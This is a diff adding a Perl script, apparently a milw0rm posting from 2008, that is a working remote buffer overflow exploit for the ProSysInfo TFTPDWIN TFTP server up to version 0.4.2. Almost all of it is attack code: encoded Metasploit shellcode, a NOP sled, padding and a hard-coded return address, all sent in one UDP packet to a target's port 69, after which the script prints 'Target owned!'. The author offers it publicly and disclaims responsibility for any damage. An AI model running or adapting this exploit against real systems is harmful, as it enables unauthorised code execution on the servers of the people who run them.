@@ -1,0 +1,98 @@
+#!/usr/bin/perl
+#
+# ProSysInfo TFTP server TFTPDWIN <= 0.4.2
+# Universal Remote Buffer Overflow Exploit
+# [Works on all Windows versions.]
+# ----------------------------------------
+# Exploit by SkD (skdrat@hotmail.com)
+#
+# Let's take a description from their page at:
+#      http://www.tftpserver.prosysinfo.com.pl
+#
+# "The TFTP Server TFTPDWIN software is a
+#  multithreaded TFTP protocol server for
+#  Windows 98/Me/2000/XP/2003. TFTP Server
+#  TFTPDWIN is compatible with RFC 1350,
+#  RFC 2347, RFC 2348, and RFC 2349, documents."
+#
+# Some of their clients include: CISCO, Alcatel-Lucent,
+# Intel, AT&T, Panasonic, Boeing ...
+#
+# Wow, all of these companies use this software!
+# This is pretty much serious.
+#
+# So this is my new exploit and I made it universal like
+# the last one. This overflow was pretty much weird at
+# first sight, but a bit of looking into the software
+# can tell you many things about it!
+#
+# If Immunity (www.immunityinc.com) can make a commerical
+# exploit for this and keep it for private clients,
+# so can I ;) but to the public :). Have fun ladies &
+# gents.
+#
+# Usage: prosystftpd_exploit.pl <target IP>
+#
+# Greets fly to InTeL.
+#
+# WARNING: Author has no responsibility over the damage
+# you do using this!
+ 
+ 
+ 
+use IO::Socket;
+use warnings;
+use strict;
+ 
+if(!($ARGV[0]))
+{
+ print "[x] ProSysInfo TFTP server TFTPDWIN <= 0.4.2\n";
+ print "    Universal Remote Buffer Overflow Exploit\n\n";
+ print "[x] Exploit by SkD (skdrat@ hotmail.com)\n\n";
+ print "[x] Usage: prosystftpd_exploit.pl <target IP>\n\n";
+ exit(0);
+}
+ 
+# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=Pex http://metasploit.com
+# Restricted chars = 0x00 0x6e 0x65 0x74
+my $shellcode =
+"\x29\xc9\x83\xe9\xde\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xaf".
+"\x4f\xb9\xec\x83\xee\xfc\xe2\xf4\x53\xa7\xfd\xec\xaf\x4f\x32\xa9".
+"\x93\xc4\xc5\xe9\xd7\x4e\x56\x67\xe0\x57\x32\xb3\x8f\x4e\x52\xa5".
+"\x24\x7b\x32\xed\x41\x7e\x79\x75\x03\xcb\x79\x98\xa8\x8e\x73\xe1".
+"\xae\x8d\x52\x18\x94\x1b\x9d\xe8\xda\xaa\x32\xb3\x8b\x4e\x52\x8a".
+"\x24\x43\xf2\x67\xf0\x53\xb8\x07\x24\x53\x32\xed\x44\xc6\xe5\xc8".
+"\xab\x8c\x88\x2c\xcb\xc4\xf9\xdc\x2a\x8f\xc1\xe0\x24\x0f\xb5\x67".
+"\xdf\x53\x14\x67\xc7\x47\x52\xe5\x24\xcf\x09\xec\xaf\x4f\x32\x84".
+"\x93\x10\x88\x1a\xcf\x19\x30\x14\x2c\x8f\xc2\xbc\xc7\xbf\x33\xe8".
+"\xf0\x27\x21\x12\x25\x41\xee\x13\x48\x2c\xd8\x80\xcc\x4f\xb9\xec";
+ 
+my $p1="\x00\x01";
+my $p2="\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00";
+ 
+my $ret = "\x5d\x10\x40"; #0040105D  -> :)  SkD's Tricks
+my $nopsled = "\x90" x 10;
+my $len = (274 - length($shellcode));
+ 
+if($len < 0) {
+    print "[x] Your shellcode is too big! Find another way :)\n";
+        exit(0);
+}
+ 
+my $overflow = "\x41" x $len;
+ 
+my $packet = (($p1).($nopsled).($shellcode).(($overflow)).($ret).($p2));
+ 
+my $sock = new IO::Socket::INET(Proto=>'udp', PeerAddr=>$ARGV[0], PeerPort=>'69');
+ 
+die "[x] Cannot Connect!\n" unless $sock;
+ 
+print "[x] Connected to daemon :)\n";
+print "[x] Sending packet..\n";
+print $sock $packet;
+sleep(1);
+close $sock;
+print "[x] Target owned!\n";
+exit(0);
+
+# milw0rm.com [2008-12-14]
